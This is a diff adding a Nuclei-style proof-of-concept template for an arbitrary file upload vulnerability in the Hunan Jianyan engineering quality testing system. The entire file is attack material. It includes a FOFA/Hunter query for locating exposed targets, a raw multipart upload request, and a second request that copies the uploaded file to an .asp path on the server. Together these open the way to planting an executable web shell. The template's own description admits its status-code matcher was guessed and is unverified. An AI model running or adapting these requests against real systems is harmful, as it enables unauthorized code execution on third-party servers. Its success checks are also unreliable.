@@ -1,0 +1,72 @@
+id: poc-73ead8a8fc9577b3e618
+info:
+  name: 湖南建研工程质量检测系统Attachment存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/73ead8a8fc9577b3e6189ea89e7bb5b6
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 73ead8a8fc9577b3e6189ea89e7bb5b6
+    fofa: + hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
+http:
+- raw:
+  - 'POST /Applications/Attachment/upload.ashx HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 204
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="123.txt"
+
+
+    12323344
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="_upload_guid"
+
+
+    123
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /Standard/Editor/API/File.cshtml?act=geturl HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-type: application/x-www-form-urlencoded
+
+    Content-Length: 59
+
+    Connection: close
+
+
+    filename=/tempData/stc.asp&filetplpath=/tempData/123.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
